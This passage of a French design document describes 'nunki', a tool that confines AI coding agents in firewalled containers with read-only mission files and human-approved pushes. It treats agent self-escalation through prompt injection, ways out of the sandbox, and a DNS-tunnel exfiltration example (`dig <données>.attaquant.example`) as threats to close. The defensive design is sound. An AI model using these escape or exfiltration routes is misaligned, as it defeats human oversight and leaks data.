déplacement, pas un changement de nature : le dossier reste partagé entre
l'hôte et le conteneur par un montage, et c'est ce partage qui fait que le HQ
et l'agent communiquent par fichiers, sans canal. Ce qu'on y gagne : le
journal partagé sans le commiter, l'arbre propre sans exclusion à maintenir,
et un dossier qui survit à `nunki slot rm`.

**Ce que l'agent peut y écrire, et rien d'autre.** Tranché par Arnaud le
2026-09-09, après que la seconde revue a montré le trou que la v1 avait
ouvert : le dossier était entièrement en écriture, `MISSION.md` compris, et
son en-tête — liste blanche, identifiants, borne — était relu par `nunki` à
chaque run. Un agent, ou un prompt injecté par une dépendance qu'il lit,
pouvait s'écrire un domaine et un fichier d'identifiants de plus au run 1 et
les obtenir au run 2. Donc :

1. L'agent n'écrit que dans **`JOURNAL.md`, `PR.md`, `VERDICT.json` et
   `MUTANTS.triage.json`**. `MISSION.md`, `FOLLOWUP_HQ.md` et `MUTANTS.json`
   lui sont montés en **lecture seule** : ils sont à l'humain et au HQ.

   Le quatrième fichier a été ajouté le 2026-09-10, avec la porte 7 (4.4) :
   le codeur doit pouvoir répondre aux survivants d'une campagne, et deux de
   ses trois réponses sont du code. Il est séparé de `MUTANTS.json` — qui
   porte la campagne et les équivalences — parce que **ce qui décide qui a
   écrit quoi est le montage, pas le contenu** : `nunki` ne peut pas lire un
   fichier et savoir de quelle main vient une ligne.
2. `nunki` **ne relit jamais l'en-tête** du dossier pendant la mission. Il le
   **fige dans son état** (`~/.nunki/<projet>/hq/state/`) au moment où l'humain
   valide le cadrage, et c'est cette copie figée qui génère chaque Compose et
   chaque liste blanche.
3. Changer la forme d'une mission en cours est un geste du HQ, par un verbe
   (`nunki mission reframe`), qui remet le cadrage devant l'humain et refige
   l'en-tête ; jamais une édition du fichier. Précisé le 2026-09-10 à
   l'implémentation : le verbe **dit d'abord ce qui changerait et ne change
   rien**, champ par champ — ce qui compte est quelle **décision** bouge, et
   un diff du texte sérialisé rapporterait une liste réordonnée comme un
   changement et un lot renuméroté comme deux. Il refuse pendant un run (le
   périmètre changerait sous un agent qui est dedans) et il refuse un
   cadrage qui supprime le lot en cours : l'état pointerait sur un travail
   que personne n'a décrit, et il n'y a pas de supposition honnête à faire.

### 4.1 bis — Le pare-feu

La première revue a lu le pare-feu hérité de `claude-setup` et l'a trouvé
troué sur quatre points : lancé par `sudo` par un utilisateur qui l'avait,
donc désactivable par l'agent ; un échec au démarrage laissait le conteneur
sans règles, en silence ; le port 53 était ouvert vers toute adresse ; toutes
les plages privées étaient ouvertes, donc le conteneur « sans services » du
codeur atteignait chaque service de la machine. La seconde revue a trouvé
deux failles dans la première correction : le résolveur embarqué de Docker
**relaie toute requête DNS** vers l'amont, donc « ouvrir le port 53 vers le
résolveur du moteur » laissait le tunnel DNS ouvert (`dig
<données>.attaquant.example`) ; et re-résoudre les domaines pendant une
campagne exige de garder une capacité que la règle « rendue après le
démarrage » avait rendue. **Tranché par Arnaud le 2026-09-09** :

1. **Le garde est un conteneur à part.** Chaque conteneur d'agent est
   accompagné d'un **sidecar pare-feu**, minuscule, qui **possède l'espace
   réseau** que l'agent rejoint (le sens est vérifié par exécution, voir
   4.2). Lui seul détient des capacités — `NET_ADMIN` et `NET_RAW` pour
   poser les règles, `SETUID` et `SETGID` parce que son résolveur descend
   sur son propre uid, et que c'est cet uid qui distingue ses requêtes de
   celles de l'agent (mesuré : sans elles, « failed to change group-id to
   dip: Operation not permitted ») ; c'est lui, et non l'agent, qui
   s'attache aux réseaux des services du projet. L'agent tourne **sans
   aucune capacité** (`cap_drop: [ALL]`, `no-new-privileges`), directement
   sous l'uid de l'hôte (`user:` dans le Compose généré, ce que le sidecar
   rend possible : plus d'entrypoint root à abandonner), sans `sudo`, sans
   binaire setuid dans son image : il n'y a rien à défaire chez lui, et une
   évasion de son processus ne trouve aucun pouvoir à côté.
2. **Un sidecar qui échoue est un agent qui ne démarre pas.** Le conteneur
   d'agent dépend du sidecar en bonne santé ; si les règles ne se posent
   pas, rien ne se lance. Jamais un agent sans règles.
3. **Le sidecar est le seul résolveur DNS** du conteneur, et il est
   **filtrant** : il ne répond que pour les domaines de la liste blanche et
   rend NXDOMAIN pour tout le reste, sans jamais relayer. Il ne suffit pas
   de l'écrire dans `/etc/resolv.conf` — le moteur y met le sien, et
   l'agent pourrait interroger un autre serveur : le sidecar **détourne
   tout le port 53** de l'espace réseau partagé vers lui-même, et refuse le
   reste. C'est ce détournement que la sonde de `nunki check` mesure. Le tunnel DNS est
   fermé par construction, dans tous les profils.
4. **Les adresses autorisées suivent les réponses DNS.** Le sidecar, qui
   répond lui-même aux questions d'adresse, ajoute au fil de l'eau les
   adresses résolues pour un domaine autorisé (un ensemble d'adresses que
   les règles consultent). Un domaine derrière un CDN qui change d'adresse
   en cours de campagne reste joignable, sans re-résolution périodique et
   sans qu'aucun pouvoir ne vive dans le conteneur de l'agent.
5. **Aucune plage privée n'est ouverte** par défaut. Un service de l'hôte ou
   un réseau nommé s'ouvre parce que la mission le déclare, adresse par
   adresse.
6. La liste blanche est **par rôle** : celle du codeur est ce que sa stack
   déclare pour ses dépendances (registres de paquets) **plus ce que
   l'adaptateur de harnais déclare nécessaire** (l'API du modèle), et rien
   d'autre ; pas de forge, pas de tronc commun — `nunki check` est rouge si un
   domaine de la forge du projet apparaît dans la liste du profil mission,
   même via une stack, sans l'arbitrage écrit qu'exige 3.2. Celle de
   l'intégrateur et de la sécurité y ajoute les services de la mission.
7. `nunki check` **sonde de l'intérieur** : depuis un conteneur du profil
   mission, et depuis un conteneur du profil système d'une mission donnée
   (`--mission <id>`), joindre un domaine interdit, résoudre un nom hors
   liste et joindre une adresse privée non déclarée doivent échouer. Ces
   sondes existent déjà comme test vivant du dépôt — `cargo test --test
   firewall -- --ignored` lève la paire depuis un Compose généré et essaie
   de sortir par sept chemins. Une sonde ne vaut que si elle réussirait sans
   le pare-feu : les deux premières écrites échouaient de toute façon (un
   certificat, une adresse inexistante) et ont été remplacées par une
   connexion TCP nue et un voisin levé exprès sur le réseau du slot.
   **Depuis le profil système** (`nunki check --mission`, 2026-09-10), la sonde
   lève le plan même de `nunki verify` pour l'intégrateur, depuis l'en-tête
   figé, mais sous un slot `<slot>-check` : tout ce que `nunki` nomme d'après le
   slot — projet Compose, réseau, volumes nommés — est alors celui du
   contrôle, et la base de données du projet est levée **à côté** de celle du
   slot, jamais sur ses volumes (seul un volume à `name:` explicite dans le
   fichier de services du projet y échapperait). Elle ajoute deux sondes que
   seul ce profil a : chaque service déclaré par la mission se résout, et
   chaque service que le projet lève **sans que la mission le déclare** ne se
   résout pas — il est sur le même réseau, et le résolveur de Compose le
   donnerait sans le pare-feu (mesuré). Joindre un service **sur son port**
   n'est pas sondé : `nunki` ne sait pas sur quel port il écoute, et le dit
   « non vérifié » plutôt que d'inventer un vert.

**Où vit l'image du sidecar.** Précisé le 2026-09-09, après que la question
« pourquoi `.nunki/` ? » a montré une erreur de rangement. Les fragments de
stack sont **ce que `nunki init` écrit pour un projet** — Dockerfile, liste
blanche, batterie — et jamais l'endroit où `nunki` range ses propres affaires.
Le contexte de build du pare-feu appartient à `nunki` : il est **embarqué dans
le binaire** et écrit dans un contexte temporaire au moment de construire
l'image. Deux raisons au-delà du rangement : les fragments sont au projet, qui
peut les modifier, et le pare-feu ne l'est pas ; et le fichier qui décrit la
cage de l'agent n'a rien à faire là où un agent ou un projet pourrait le
changer.

Ce que le sidecar coûte : un conteneur de plus par agent, que `nunki` lève et
arrête avec lui, invisible pour l'humain ; et une différence de moteur, parce
que « partage l'espace réseau de ce service » s'écrit `network_mode:
"service:<agent>"` sous Docker Compose et seulement `container:<nom>` sous
`podman-compose` — c'est à l'adaptateur de moteur de le savoir (4.2).

### 4.2 Le moteur — `nunki`

Une commande, sur la machine de l'humain, hors conteneur. Elle pilote des
clones, des conteneurs et des runs d'agent. Elle ne connaît le harnais que
par un adaptateur (4.3), et le moteur de conteneurs que par un autre.

| verbe | fait |
|---|---|
| `nunki init <dépôt>` | rend un dépôt **existant** orchestrable. Dans le dépôt, en respectant 3.3 : `AGENTS.md` (ou l'import dans `CLAUDE.md`) et un `.gitattributes` absent — rien d'autre. Dans le home du projet (`~/.nunki/<projet>/`) : `nunki.yaml` avec la liste des chemins protégés, le HQ (`hq/`), et les fragments de stack (`stacks/<nom>/`) avec la batterie cousue et le Dockerfile. Crée ce qui n'existe pas, dépose à côté ce qui existe, ne touche à rien d'autre, ne tient aucun manifeste, ne désinstalle rien. Rejouable. |
| `nunki slot add/reset/rebuild/rm` | un slot = un clone local sans liens durs, un jeu de volumes nommés, et **trois profils de conteneur successifs** (voir « slots et branches » ci-dessous). Les missions s'y succèdent. |
| `nunki mission new/start/reframe/status/say/watch/pause/resume/stop/kill/end/accept/iterate/fetch/archive` | le cycle d'une mission, du cadrage au rapatriement des commits ; `say` dépose une consigne pour le **run suivant**, `watch` rend deux états (tourne, fini) plus un troisième que l'humain provoque (gelé), `stop` termine le run proprement (4.3), **`end` déclare la mission abandonnée** |
| `nunki exec <slot> <cmd>` | joue une commande dans le conteneur du slot — c'est ainsi que le HQ **rejoue une preuve** sans avoir la stack sur l'hôte. Par défaut sur la **copie git propre de `HEAD`** que la porte 7 utilise, pas sur l'arbre que l'agent a habité : un `Makefile`, un `pytest.ini` ou un alias `cargo` posé par l'agent y tromperait la preuve. Jamais pendant un run sur l'arbre de travail |
| `nunki verify <mission>` | les portes de vérification sur la mission du codeur, puis enchaîne la mission d'intégration, puis la mission de sécurité, chacune avec ses portes ; à la première rouge, applique les règles d'itération (4.5) ; à la fin, rend la main à l'humain pour la validation du push. **Reprenable** : son état est persisté à chaque transition, et le relancer reprend au même point |
| `nunki push <mission>` | après validation humaine explicite (un argument, pas un dialogue), pousse la branche depuis le dépôt principal et ouvre la pull request. C'est le seul verbe qui touche la forge en écriture, et il refuse sans `INTEGRATED` et `CLEAR` sur le dernier commit et le verdict du codeur sur son ancêtre (4.4). Il parle à l'API de la forge avec un credential de l'humain, rangé à côté des comptes (`~/.nunki/forge-token`, un jeton GitHub qui peut ouvrir des pull requests) et jamais monté dans un conteneur — un conteneur ne voit du HQ que son propre dossier de mission, un niveau plus bas. **Le même `--yes` couvre le push et l'ouverture** : un verbe, un argument. Titre et corps viennent du `PR.md` de la mission (la première ligne qui dit quelque chose est le titre) ; une pull request déjà ouverte pour la branche — second push après un volet — est retrouvée, pas signalée en échec. Sans credential, sur une remote dont la forge n'a pas d'adaptateur, ou si la forge refuse, **le push reste fait** et `nunki` rend l'adresse exacte à ouvrir avec la raison : un push rapporté rouge serait relancé, et le second `git push` ne ferait rien qu'effacer la trace du premier. **Un adaptateur par forge**, comme il y en a un par harnais (4.3) et un par moteur de conteneurs (4.2) : ce qui est propre à une forge — l'adresse de son API, la forme de ses requêtes, la façon dont une remote nomme un dépôt — vit dans son adaptateur, et rien au-dessus ne le connaît. GitHub est le seul implémenté, parce que c'est celui des projets ici ; une remote ailleurs est **dite ailleurs, jamais devinée**, et ajouter GitLab est un fichier à écrire, pas un remaniement. Client HTTP : `ureq`, choisi par Arnaud le 2026-09-10 ; ses racines de confiance sont celles de Mozilla, embarquées (`webpki-roots`, données sous CDLA-Permissive-2.0, exception écrite dans `deny.toml` pour cette seule crate) — un proxy d'entreprise qui re-signe le TLS serait la raison d'y revenir |
| `nunki check [--mission <id>]` | dit si un dépôt, ses slots et leurs conteneurs sont dans l'état que ce fichier décrit ; rouge si une restriction n'est pas tenue ; sonde le profil mission sans argument, et le profil système d'une mission donnée avec `--mission` ; **dit ce qu'il n'a pas pu vérifier** (la forge sans credential ou quand l'humain tient la protection à la main, LF quand un `.gitattributes` existant ne le force pas) |
| `nunki logs <mission>` | rend la sortie structurée des runs, lisible |

**Qui pousse, en une phrase.** L'humain valide ; `nunki push`, lancé par la
session HQ sur l'ordre de l'humain, pousse ; aucun agent ne pousse jamais.
Tranché par Arnaud le 2026-09-09 — la revue avait trouvé trois réponses dans
le brouillon. La politique de push intermédiaire
vers `dev` que `claude-setup` autorisait en projet personnel n'existe plus :
une mission, une pull request, un push.

**Le verbe s'appelle `verify`, pas `close`.** Tranché par Arnaud le
2026-09-09 : « close » lui avait fait croire qu'il s'agissait de clôturer la
mission du codeur, alors que le verbe couvre toute la phase de vérification —
portes, intégration, sécurité, itérations — jusqu'à la validation humaine.
Son résultat est `VERIFIED`, ou l'échec nommé. « Clôturer » redevient un mot
pour ce qui vient après le push : `nunki mission archive`. Il **déplace**, il
n'efface jamais — les journaux, le texte de la pull request et les verdicts
sont le compte rendu de ce qui a été fait — et il laisse le slot tranquille :
`nunki slot reset` et `nunki slot rm` sont les verbes d'un slot. Il refuse une
mission encore en travail : l'archiver la cacherait au lieu de la clore. Les
deux endroits où une mission se termine sont `Verified` et « rendue à
l'humain », et la seconde compte : sinon le HQ garde des missions que
personne ne peut clore.

**`end`, et une définition dérivée.** Ce verbe figurait dans la liste
ci-dessus sans être décrit nulle part, et l'implémentation du 2026-09-10 a
buté sur le trou qu'il laisse : `stop` termine un **run**, `archive` clôt une
mission **finie**, et entre les deux se tenait une mission qu'un humain
abandonne — encore en `Coding`, jamais vérifiée, impossible à clore.
`nunki mission end <mission> --because <pourquoi>` la clôt, et `archive` la range
ensuite. La raison n'est pas facultative : une mission abandonnée sans raison
est une énigme pour qui la retrouve six mois plus tard, et elle est écrite là
où un humain la lit, dans `FOLLOWUP_HQ.md`, pas seulement dans l'état. Le
verbe vaut **partout où une mission peut encore être travaillée** — un verbe
qui marcherait dans cinq étapes sur sept est un verbe sur lequel l'humain ne
peut pas compter au moment où il veut sortir — et refuse sur une mission déjà
terminée. Dérivée d'abord, faute de texte : **confirmée par Arnaud le
2026-09-10**, nom et définition.

`nunki slot reset` remet un slot au propre **sans le détruire** : le clone
reste — `nunki slot rm` est le verbe qui supprime — et ce qui part, c'est le
travail en cours et les **volumes nommés** du slot. C'est la vraie raison
d'y toucher : un cache de compilation ou un répertoire d'état de harnais
devenu mauvais survit à toutes les reconstructions d'image, et rien d'autre
ne l'atteint. Il refuse sur les mêmes bases que `rm`.

**Pourquoi un seul verbe.** Cette phase est une seule machine à états —
codeur, puis intégrateur, puis sécurité, avec des retours en arrière — et si
elle était découpée en verbes, ce serait à la session HQ de se souvenir où on
en est, de relancer le bon rôle après un rouge, de vérifier que les verdicts
portent le bon commit : exactement ce que le contexte d'une session perd.
`verify` la tient dans un état persisté ; la session HQ le lance, le regarde
(`status`, `logs`, `watch`) et intervient (`say`, `pause`, `stop`, `kill`),
elle n'orchestre pas. `verify` ne pousse jamais, ne merge jamais, n'accepte
aucun risque : ces trois gestes sont à l'humain.

**L'état de `nunki` est persisté, et verrouillé.** Tranché par Arnaud le
2026-09-09. `nunki verify` dure des heures et doit survivre à la mort de la
session HQ, à une machine en veille, à un terminal fermé. Son état —
mission, étape, run en cours, volets joués, tentatives par lot, verdicts et
leurs `HEAD` — vit dans `~/.nunki/<projet>/hq/state/`, un fichier par mission,
écrit à chaque transition. Ce que la seconde revue a fait préciser :

- **Le verrou ne couvre que les verbes qui changent l'état** : `start`,
  `verify`, `reset`, `rebuild`, `rm`, `push`. Les verbes lecteurs — `status`,
  `logs`, `watch`, `check` — passent toujours, et `say`, `pause`, `resume`,
  `stop`, `kill` aussi : ce sont des gestes sur un run en cours, pas des
  transitions concurrentes. `nunki exec` lancé par `verify` s'exécute **sous**
  son verrou, il ne le demande pas une seconde fois.
- **L'état d'un run est persistable** : identifiant du conteneur, identifiant
  de session du harnais, pid, écrits à chaque lancement. Un run est lancé
  **détaché** et survit à la mort de la session HQ qui l'a lancé.
- **La reprise re-dérive avant de décider.** Un `nunki` qui redémarre ne croit
  pas l'état sur parole : il demande au moteur si le conteneur existe et
  tourne. Vivant : il reprend la surveillance là où elle était. Mort (une
  veille de la machine, Docker Desktop qui redémarre sans ses conteneurs) :
  le run est classé interrompu pour cause du harnais, sans consommer de
  tentative, et relancé en reprenant la session du harnais depuis le dernier
  état de reprise du journal — la reprise à froid que `claude-setup` avait
  éprouvée, appliquée à `nunki` lui-même.
- **Un verrou orphelin se lève tout seul** : il porte le pid et l'heure de
  qui l'a pris ; si ce processus n'existe plus, le verrou est libre, avec une
  ligne dans le journal de `nunki`.

**Slots et branches.** Tranché par Arnaud le 2026-09-09. La revue a montré qu'avec un slot par rôle, les commits du codeur
n'atteignaient l'intégrateur qu'après un aller-retour par le dépôt principal,
qu'un volet du codeur devait repartir avec les commits de l'intégrateur, et
que la mutation tournait dans un slot sur un `HEAD` qui n'était plus le sien.
Donc : **un slot par mission, et les trois rôles s'y succèdent** sur le même
clone et la même branche, chacun dans son profil de conteneur — `nunki` arrête
le conteneur du profil précédent et lève le suivant sur le même arbre. Les
commits ne bougent jamais entre slots ; ils ne sortent du slot que par
`nunki mission fetch`, vers le dépôt principal, au moment du push. « Un slot =
un clone, un conteneur » devient « un slot = un clone, des volumes, un
conteneur d'agent à la fois ».

**Une mission part d'une base que le slot a rafraîchie.** Ajouté le
2026-09-17, sur un défaut qui avait mordu deux fois. Un slot est un clone, et
un clone écrit son propre `dev` une fois : rien ne le rebouge ensuite. Chaque
mission après la première partait donc de la base telle qu'elle était le jour
où le slot a été créé, et sa pull request s'ouvrait contre une base qui avait
avancé. L'`origin` d'un slot étant le dépôt de la machine et non la forge, le
rafraîchir est une opération locale qui ne demande pas de réseau ; elle est
faite au moment où le slot passe sur la branche de la mission, jamais en cours
de mission, et son échec est dit plutôt qu'avalé — partir d'une base qu'on n'a
pas pu rafraîchir est exactement le silence que cela remplace.

**Et une branche qui porte déjà du travail est reprise, jamais repositionnée.**
Même date, même lecture. `checkout -B` repointe une branche sur son point de
départ : mesuré le 2026-09-17, `checkout -B mission/x dev` sur une branche
portant un commit de travail l'a laissée n'en porter aucun. Tout lancement qui
trouvait le slot sur une autre branche — un humain qui regarde quelque chose,
un changement de rôle qui n'est pas revenu — payait le travail de la mission
pour y retourner.

**Les services et le lancement de l'application.** Tranché par Arnaud le
2026-09-09, après que la seconde revue a montré que personne ne relançait le
livrable pour la sécurité une fois le conteneur de l'intégrateur arrêté.
Trois règles, et une seule mécanique quelle que soit la forme de la mission :

1. **Les services sont levés une fois par slot**, sous un nom de projet
   Compose stable, et **jamais arrêtés entre deux profils**. L'état que
   l'intégrateur a posé — migrations jouées, fixtures — survit ; seul le
   conteneur d'agent change.
2. **Lancer l'application n'est le travail d'aucun agent : c'est `nunki` qui la
   démarre**, par `nunki exec`, dans le profil de l'agent qui va la tester ou
   l'attaquer, avant de lancer cet agent. Il le fait à partir d'un **script
   de lancement qui appartient au projet** : le fragment de stack en fournit
   un par défaut (`run.sh` : comment on démarre une application de cette
   stack), `nunki.yaml` peut le remplacer, l'en-tête de mission peut le
   préciser, et quand l'intégrateur est appelé, ce script fait partie de son
   câblage — il peut l'amender et le commite, et c'est cette version que
   `nunki` utilise ensuite. Un projet sans exécutable (une bibliothèque) déclare
   `run: none`, et l'agent sécurité travaille sur le code et l'artefact de
   build.

   | forme | qui démarre l'application, à partir de quoi |
   |---|---|
   | intégration puis sécurité | `nunki` la démarre pour l'intégrateur, puis la redémarre pour la sécurité, avec le script tel que l'intégrateur l'a commité, sur les mêmes services jamais arrêtés |
   | sécurité seule, sans services | `nunki` la démarre pour la sécurité avec le script de la stack ou du projet ; `run: none` pour une bibliothèque |
   | code seul | rien à démarrer, personne n'est appelé |

   **Ce que le script de lancement ne doit pas faire, mesuré le 2026-09-10.**
   `nunki` lance ce script détaché dans le conteneur de l'agent et reconnaît le
   processus **à l'identifiant posé sur sa ligne de commande** — la même
   mécanique que pour un run de harnais ou une campagne de mutation. Un
   script qui finit par `exec` remplace son propre processus, donc sa ligne
   de commande, donc l'identifiant : la vérification de vivacité répond
   « terminée » sur une application qui tourne. Le fragment de stack le dit
   en commentaire et n'`exec` pas, et le test live joue les deux formes côte
   à côte pour que la différence soit mesurée et non affirmée.

   **Le bloc `volumes:` du projet est fusionné avec ceux du slot**, mesuré le
   2026-09-10 sur Compose v5.1.2 : un service qui nomme un volume que le
   document ne déclare pas rend le projet entier invalide (`service "db"
   refers to undefined volume dbdata: invalid compose project`). Et c'est
   précisément là qu'un projet range ce qui doit survivre à une bascule de
   profil, donc l'oublier reviendrait à jeter l'état que la règle 1 existe
   pour garder. Un projet ne peut pas nommer un volume en `nunki-<slot>-` :
   ceux-là sont au slot, et le lui donner serait lui tendre le cache de
   compilation ou les sessions du harnais.

   **Le projet Compose porte la session, puis le slot** : `nunki-<session>-<slot>`,
   les huit premiers caractères de l'identifiant que `sessions.json` donne au
   dépôt (tranché par Arnaud le 2026-09-16). Le slot seul ne suffit pas :
   mesuré ce jour-là, `test-nunki` et `notes-api` avaient tous deux un slot
   `one` et étaient donc **le même projet Compose** — un seul jeu de
   conteneurs, un seul réseau, un seul volume de harnais portant les sessions
   des deux projets. Lancer une mission sur l'un aurait recréé les conteneurs
   de l'autre sous un agent en train de travailler, et le `locks/one` de
   chaque HQ aurait dit que le slot était libre. La session d'abord, pour
   qu'un `docker ps` groupe les conteneurs d'un projet.

   La sécurité attaque ainsi exactement ce que l'intégrateur a validé quand
   il est passé, et sinon ce que le projet déclare comme façon normale de
   démarrer. Aucun agent ne décide comment on lance l'application, et il n'y
   a qu'un mécanisme à coder.
3. **L'arbre reste en lecture seule pour la sécurité**, et c'est le fragment
   de stack qui déclare les **répertoires que l'exécution doit pouvoir
   écrire** (`target/`, `.next/`, caches), montés comme volumes propres au
   profil. Ce qui n'est pas déclaré reste fermé.

   **Deux conditions, mesurées le 2026-09-10, et il faut les deux.** Un
   volume nommé monté sur un sous-chemin d'un bind en lecture seule :

   - **prend sa propriété de l'image** — si l'image ne porte pas ce
     répertoire, le volume naît à `root` et un conteneur sans capacité ne
     peut rien y faire ; s'il le porte et qu'il est `chown`é à l'agent, le
     volume arrive à l'agent. C'est donc la couche `nunki` de l'image qui crée
     ces répertoires, à partir de `writable.txt` ;
   - **exige que le point de montage existe aussi dans la source du bind**,
     sinon le conteneur ne démarre pas du tout (`create mountpoint for
     /work/tree/target: read-only file system`). `nunki` crée donc le
     répertoire vide dans l'arbre du slot avant de lever le profil — c'est
     un répertoire que le projet ignore, invisible à `git status`, donc la
     porte 1 reste verte.

   La profondeur ne change rien : `packages/web/node_modules` se comporte
   comme `target`. Et comme une image périmée porte le même tag, `nunki` ne peut
   pas voir la différence avant de lever : il **demande au conteneur levé**
   si ces répertoires sont réellement inscriptibles, et nomme
   `nunki slot rebuild` sinon. Sans cette question, la seule mesure qui compte
   ici ne serait garantie par rien à l'exécution.

**La forme déclarative des conteneurs : Compose, généré par `nunki`.** Tranché
par Arnaud le 2026-09-09. La revue a établi que Compose est un plugin de la
CLI, pas une notion de l'API : « un Compose levé par l'API » n'existe pas.
Les deux issues pures étaient mauvaises — appeler `docker compose` sur un
fichier écrit à la main enferme dans une CLI, et un format propre réinvente
Compose à moitié. La voie retenue : **Compose reste le format**, connu de
tous et celui dans lequel le projet écrit ses propres services ; **`nunki`
génère le fichier** de chaque profil à chaque lancement, à partir de
`nunki.yaml`, du fragment de stack et de l'en-tête du `MISSION.md` (image,
utilisateur et uid, montages, variables, réseau, capacité donnée à
l'entrypoint, liste blanche calculée, services du projet inclus) ; puis un
**adaptateur de moteur** l'exécute — `docker compose` ou
`podman-compose`, et le chemin de la socket — et ne fait rien d'autre. `nunki`
n'invente aucun format, et la frontière de moteur subsiste, réduite à ce
qu'elle doit être. Le devcontainer et sa CLI en Node ne sont plus une
dépendance ; `devcontainer.json` survit en vue IDE du profil interactif.

Les micro-VM restent une option de second rideau, pour le seul rôle qui
attaque, le jour où `nunki` tournerait sur un Linux natif sans VM devant ses
conteneurs, ou pour un livrable dont les données le justifient. Sur macOS et
sous WSL, la VM de Docker Desktop est déjà une frontière entre les conteneurs
et la machine ; ce qui compte tout de suite est de ne jamais donner à un
conteneur d'agent ce qui rend l'évasion triviale (4.1 bis).

**Le moteur est écrit en Rust.** Tranché par Arnaud le 2026-09-09.
`claude-setup` était un seul fichier bash de trois mille lignes, et c'est en
partie ce qui l'a rendu illisible et impossible à tester unitairement. Ce que
le choix engage : un binaire unique `nunki`, sans runtime à installer sur la
machine de l'humain ; des types pour les états d'une mission, d'un slot et
d'un verdict, qui rendent les transitions du flux 4.5 vérifiables à la
compilation ; des tests unitaires sur le moteur et des tests d'intégration
contre de vrais `git` et un vrai Compose. Ce que le moteur
continue de déléguer au shell : les fragments par stack (batterie, mutation,
caches, domaines) et les scripts que les conteneurs exécutent, parce qu'ils
tournent dans le conteneur et non dans `nunki`.

Pourquoi un langage typé pour « lancer des commandes », question posée et
tranchée le 2026-09-09 : parce que `nunki` n'est pas un script qui enchaîne des
commandes, c'est un programme qui **tient un état** — quel slot porte quelle
mission, sur quel `HEAD`, avec quel verdict de quel rôle, combien de volets
joués — et qui **lit des sorties** (JSON du harnais, résultat de mutation) et
**décide en attendant** (`watch`, délais). Le flux 4.5 est une machine à
états ; les types la font respecter à la compilation, les tests la vérifient
sans conteneur, et une sortie de forme inattendue devient une erreur au lieu
d'un silence. Rust plutôt que Python achète en plus le binaire unique sans
runtime ; il coûte du temps d'écriture, et c'est accepté.

**Les slots sont construits par `nunki`, pas repris d'un outil tiers.** Tranché
par Arnaud le 2026-09-09. Des outils existent qui isolent un agent dans un
clone et un conteneur (section 5), mais aucun n'a été conçu avec la
contrainte qui fait la sécurité du slot — un `origin` inatteignable depuis le
conteneur — et deux des quatre sont morts ou mourants. Un slot, c'est un
`git clone` local, des conteneurs levés par le Compose généré, et des volumes
nommés ; la doctrine autour est ce qui compte, et elle est ici. Ce qu'on perd
en construisant : la vue d'ensemble graphique que ces outils offrent, absente
de `nunki` au départ.

**Le moteur de conteneurs est derrière une frontière**, comme le harnais,
**et cette frontière n'est pas minuscule.** Tranché par Arnaud le 2026-09-09,
après que la seconde revue a dressé la liste réelle de ce qui diffère entre
`docker compose` et `podman-compose` pour tenir ce que 4.1 bis et les profils
exigent. L'adaptateur de moteur porte, et lui seul :

| ce qui diffère | Docker Compose | podman-compose |
|---|---|---|
| partage d'espace réseau pour le sidecar | l'agent rejoint le pare-feu : `network_mode: "service:<pare-feu>"` **sur le service d'agent** (voir le sens, plus bas) | seulement `container:<nom>`, nom généré à connaître avant |
| mappage des utilisateurs en mode sans root | sans objet | `userns_mode: keep-id`, propre à Podman |
| joindre l'hôte sur déclaration | `host.docker.internal` via `host-gateway` | `host.containers.internal` natif, `host-gateway` mal supporté |
| inclusion des services du projet | `include:` fonctionne | `include:` plante — donc **`nunki` fusionne lui-même le YAML** des services du projet dans le Compose généré, sur les deux moteurs |
| conditions de démarrage entre services | `service_healthy`, `service_completed_successfully` | la première buguée, la seconde absente |
| profils Compose | fiables | bugués — donc **un fichier par profil** avec un nom de projet stable, jamais `profiles:` |
| adresse du résolveur | dépend du **mode réseau**, pas de la plateforme | idem, autres adresses (aardvark, pasta, slirp) |
| commande et socket | `docker compose`, socket détectée | `podman-compose`, socket détectée |

**Le sens du partage d'espace réseau, vérifié par exécution le 2026-09-09.**
La v2 écrivait `network_mode: "service:<agent>"` sur le sidecar — le
pare-feu rejoignait l'agent. Mesuré sur Docker Compose v5.1.2 : dans ce
sens, **l'agent démarre le premier** et le sidecar second (il en dépend),
donc l'agent a un réseau avant que la moindre règle soit posée, ce qui
contredit 4.1 bis §2. Le sens juste est l'inverse : **le pare-feu possède
l'espace réseau, l'agent le rejoint** (`network_mode: "service:<pare-feu>"`
sur le service d'agent) et l'attend par `depends_on: { <pare-feu>: {
condition: service_healthy } }`. Mesuré dans ce sens : le sidecar pose ses
règles, passe healthy, et l'agent démarre ensuite — avec `cap_drop: [ALL]`,
`no-new-privileges` et l'uid de l'hôte, que le partage d'espace réseau
n'affecte pas. **Conséquence pour le générateur** : Compose refuse
`network_mode` et `networks` sur le même service (« mutually exclusive
`network_mode` and `networks`: invalid compose project », mesuré) — donc
c'est **le pare-feu** qui s'attache au réseau des services du projet et qui
porte les ports, jamais l'agent.

**Le changement de profil ne touche pas aux services, vérifié par exécution
le 2026-09-09.** Sous un nom de projet stable, lever un second fichier qui
**redéclare les services du projet à l'identique** laisse leurs conteneurs
intacts — même identifiant, même heure de démarrage (mesuré). Un fichier qui
les **omet** ne les arrête pas non plus, mais Compose les signale comme
« orphelins » à chaque commande. Donc la règle du générateur : **chaque
fichier de profil redéclare les services du projet à l'identique**, et `nunki`
ne passe jamais `--remove-orphans`. Arrêter le conteneur d'agent du profil
précédent reste un geste explicite de l'adaptateur de moteur.

Une bonne part de ces différences sont des bugs ouverts de `podman-compose`,
pas des choix de conception. D'où : **la première version ne vise que
Docker** — Docker Desktop sur macOS et sous WSL, Docker Engine dans WSL, ce
que les deux humains du projet utilisent. **Podman est une cible seconde**,
documentée par ce tableau pour qui l'implémentera, avec la note honnête que
tant que `podman-compose` porte ces bugs, son adaptateur devra contourner ou
générer un Compose plus simple. Rien d'autre du moteur ne remonte dans `nunki`.

**La base des images, et pourquoi elle n'est pas la même partout.** Tranché
par Arnaud le 2026-09-09, après qu'il a scanné l'image du sidecar.

- **Les images de stack — les conteneurs d'agent — sont sur une base
  glibc** (Debian slim). musl coûte trop cher là où le travail a lieu : les
  wheels `manylinux` de Python sont glibc et retombent sinon sur une
  compilation depuis les sources, les binaires natifs préconstruits de Node
  visent glibc, Rust change de cible, et la pile de thread par défaut de musl
  (128 Kio contre 8 Mio) fait tomber des logiciels qui ne s'y attendent pas.
- **Le sidecar pare-feu est sur Alpine**, avec son dnsmasq compilé (4.1 bis).
  Mesuré le 2026-09-09 : `debian:bookworm-slim` porte 4 vulnérabilités
  critiques et 52 hautes **dont aucune n'est corrigeable** — Debian les marque
  « ne sera pas corrigé » — et le sidecar fini arrivait à 8 critiques, 55
